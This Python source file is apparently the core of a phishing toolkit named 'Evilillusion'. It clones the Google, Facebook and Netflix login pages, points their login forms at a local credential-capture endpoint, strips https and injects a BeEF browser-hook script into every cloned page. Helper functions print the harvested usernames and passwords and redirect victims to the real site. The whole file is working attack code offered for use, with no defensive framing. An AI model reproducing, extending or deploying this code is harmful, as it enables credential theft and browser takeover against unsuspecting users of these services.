try:
    from os import walk, getcwd
    from os.path import join, exists, getctime
    from time import time, ctime, strftime, localtime
    from datetime import datetime
    from tldextract import extract
    from requests import get as GET
    from bs4 import BeautifulSoup as BS
    from socket import socket, AF_INET, SOCK_DGRAM
except ImportError as err_func_import:
    raise (err_func_import)

class Google:
    def __init__(self, user_agent, is_mobile):
        self.URL = "https://www.google.com"
        self.SEARCH_URL = "https://www.google.com/search?source=hp&ei=xaMdXti3GYKYac_btcAO&q="
        self.user_agent = user_agent
        self.headers = {'User-Agent': self.user_agent}
        self.path = "Evilillusion/templates/google/google_mobile.html" if is_mobile else "Evilillusion/templates/google/google_desktop.html"
        self.search_path = "Evilillusion/templates/google_search/index.html"
        self.CHANGED = []
        self.is_mobile = is_mobile

    def GetHomePage(self):
        if not exists(self.path):
            response = GET(self.URL, headers=self.headers)
            f_data = self._parse_html(response.text)
            f_data = self._change_files(f_data)
            f_data = core.InjectFavIcon(f_data, 'google')
            f = open(self.path, mode="w")
            f.write(f_data)
            f.close()
        else:
            if "day" in core.CompareFile(self.path):
                response = GET(self.URL, headers=self.headers)
                f_data = self._parse_html(response.text)
                f_data = self._change_files(f_data)
                f_data = core.InjectFavIcon(f_data, 'google')
                f = open(self.path, mode="w")
                f.write(f_data)
                f.close()
        return '/'.join(self.path.split("/")[2::])

    def Search(self, word):
        response = GET(self.SEARCH_URL+word, headers=self.headers)
        f_data = self._parse_html(response.text)
        f_data = self._change_files(f_data)
        f_data = core.InjectFavIcon(f_data, 'google')
        f = open(self.search_path, mode="w")
        f.write(f_data)
        f.close()
        return '/'.join(self.search_path.split("/")[2::])

    def _parse_html(self, content):
        soup = BS(content, 'html.parser')
        images = soup.find_all('img')
        self._handle_images(images)
        content = BeefXSS(str(soup)).inject_beef()
        return self._change_to_http(content)

    def _handle_images(self, images):
        for img in images:
            try:
                on_static_path = '/static/images/'+img['src'].split('/')[-1]
                self._download(link=self.URL+img['src'], save_as=on_static_path[1:])
                img['src'] = on_static_path
                self.CHANGED.append(on_static_path.split('/static')[1])
            except:
                pass
    
    def _download(self, link, save_as):
        response = GET(link)
        with open(save_as, mode='wb') as f:
            f.write(response.content)

    def _change_to_http(self, content):
        content = content.replace('https', 'http')
        return content

    def _change_files(self, content):
        for r, _, f in walk(join(getcwd(), 'static/images')):
            for _f in f:
                _ = join(r, _f).split('/static')[1]
                on_static_ = f'/static{_}'
                if _ in content:
                    if _ in self.CHANGED:
                        pass # Already changed
                    else:
                        content = content.replace(_, on_static_)
                        self.CHANGED.append(_)
        return content


class Facebook:
    def __init__(self, user_agent, is_mobile):
        self.URL = "https://facebook.com/"
        self.user_agent = user_agent
        self.headers = {'User-Agent': self.user_agent}
        self.path = "Evilillusion/templates/facebook/facebook_mobile.html" if is_mobile else "Evilillusion/templates/facebook/facebook_desktop.html"
        self.is_mobile = is_mobile

    def GetHomePage(self):
        if not exists(self.path):
            response = GET(self.URL, headers=self.headers)
            content = self._parse_html(response.text)
            content = core.InjectFavIcon(content, 'facebook')
            f = open(self.path, mode="w")
            f.write(content)
            f.close()
        else:
            if "day" in core.CompareFile(self.path):
                response = GET(self.URL, headers=self.headers)
                content = self._parse_html(response.text)
                content = core.InjectFavIcon(content, 'facebook')
                f = open(self.path, mode="w")
                f.write(content)
                f.close()
        return '/'.join(self.path.split("/")[2::])

    def _parse_html(self, content):
        soup = BS(content, 'html.parser')
        form = soup.findAll("form", {"id" : "login_form"})
        for _ in form:
            _['action'] = "login"
        content = BeefXSS(str(soup)).inject_beef()
        return self._change_to_http(str(content))

    def _change_to_http(self, content):
        content = content.replace('https', 'http')
        return content

class Netflix:
    def __init__(self, user_agent, is_mobile):
        self.URL = "https://www.netflix.com/ma-en/login"
        self.user_agent = user_agent
        self.headers = {'User-Agent': self.user_agent}
        self.path = "Evilillusion/templates/netflix/netflix_mobile.html" if is_mobile else "Evilillusion/templates/netflix/netflix_desktop.html"
        self.is_mobile = is_mobile

    def GetHomePage(self):
        if not exists(self.path):
            response = GET(self.URL, headers=self.headers)
            content = self._parse_html(response.text)
            content = core.InjectFavIcon(content, 'netflix')
            f = open(self.path, mode="w")
            f.write(content)
            f.close()
        else:
            if "day" in core.CompareFile(self.path):
                response = GET(self.URL, headers=self.headers)
                content = self._parse_html(response.text)
                content = core.InjectFavIcon(content, 'netflix')
                f = open(self.path, mode="w")
                f.write(content)
                f.close()
        return '/'.join(self.path.split("/")[2::])

    def _parse_html(self, content):
        soup = BS(content, 'html.parser')
        form = soup.findAll("form", {"class" : "login-form"})
        for _ in form:
            _['action'] = "login"
        content = BeefXSS(str(soup)).inject_beef()
        return self._change_to_http(str(content))

    def _change_to_http(self, content):
        content = content.replace('https', 'http')
        return content

class BeefXSS:
    def __init__(self, data):
        self.data =  data
        self.local_ip = self.GetLocalIP()
        self.script = f"<script type='text/javascript' 'src=http://{self.local_ip}:3000/hook.js'></script></body>"

    def inject_beef(self):
        if self.script in self.data:
            return self.data
        self.data = self.data.replace('</body>', self.script)
        return self.data

    def HookTemplate(self, tem):
        with open(f"Evilillusion/templates/{tem}", mode="r") as inf:
            self.data = inf.read()
            inf.close()
            content = self.inject_beef()
            with open(f"Evilillusion/templates/{tem}", mode="w") as ouf:
                ouf.write(content)
                ouf.close()
        return tem

    def GetLocalIP(self):
        s = socket(AF_INET, SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        x = s.getsockname()[0]
        s.close()
        return x


class core:
    WHITE = u"\u001b[38;5;255m"
    BLACK = u"\u001b[38;5;0m"
    RED = u"\u001b[38;5;196m"
    GREEN = u"\u001b[38;5;40m"
    BLUE = u"\u001b[38;5;21m"
    YELLOW = u"\u001b[38;5;220m"
    MAG = u"\u001b[38;5;125m"
    BLINK = "\033[6m"
    UNDERLINE = "\033[4m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

    @staticmethod
    def print_info(domain, message):
        domain = core.BLUE+domain+core.RESET
        sep = f"{core.YELLOW}{core.BOLD} »» {core.RESET}"
        print(f"{core._time()} {domain}{sep}{core.BOLD}{message}.")

    @staticmethod
    def print_success(domain, message):
        domain = core.BLUE+domain+core.RESET
        sep = f"{core.YELLOW}{core.BOLD} »» {core.RESET}"
        print(f"{core._time()} {domain}{sep}{core.BOLD}{message}.")

    @staticmethod
    def print_fail(domain, message):
        domain = core.RED+domain+core.RESET
        sep = f"{core.YELLOW}{core.BOLD} »» {core.RESET}"
        print(f"{core._time()} {domain}{sep}{core.BOLD}{message}.")

    @staticmethod
    def show_creds(domain, data):
        ffield, passwd = "username", "password"
        print(f"\n{core.RESET}[{core.BLUE}{core.BOLD}{domain.upper()}{core.RESET}]")
        print(f"    {core.RESET}{ffield:10}= {core.YELLOW}'{core.GREEN}{data['username']}{core.YELLOW}'")
        print(f"    {core.RESET}{passwd:10}= {core.YELLOW}'{core.GREEN}{data['password']}{core.YELLOW}'{core.RESET}\n")

    @staticmethod
    def _time():
        return strftime(f"[{core.YELLOW}{core.BOLD}%H:%M:%S{core.RESET}]", localtime())

    @staticmethod
    def GetClientIP(request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        ip_address = x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')
        return ip_address

    @staticmethod
    def GetFileCreatedTime(file):
        return ctime(getctime(file))

    @staticmethod
    def CompareFile(file):
        now = ctime(time())
        file_created_at = core.GetFileCreatedTime(file)
        t1 = datetime.strptime(str(file_created_at), '%a %b %d %H:%M:%S %Y')
        t2 = datetime.strptime(str(now), '%a %b %d %H:%M:%S %Y')
        return str(t2-t1)

    @staticmethod
    def InjectFavIcon(content, website):
        _ = f"</title><link rel='icon' href='/static/favicon/{website}.ico' type='image/gif' sizes='16x16'>"
        content = content.replace('</title>', _)
        return content

    @staticmethod
    def GetLoginFields(website):
        SERVICE = extract(website)
        if SERVICE.domain == "facebook":
            return "email", "pass"
        if SERVICE.domain == "netflix":
            return "userLoginId", "password"

    @staticmethod
    def GetRedirectTarget(website):
        SERVICE = extract(website)
        if SERVICE.domain == "facebook":
            return "https://facebook.com"
        if SERVICE.domain == "netflix":
            return "https://netflix.com/"

    @staticmethod
    def NewClient(domain, ip):
        domain = core.GREEN+domain+core.RESET
        sep = f"{core.YELLOW}{core.BOLD} »» {core.RESET}"
        print(f"{core._time()} {domain}{sep}{core.BOLD}{core.MAG}{ip}{sep}new user has accessed ...")
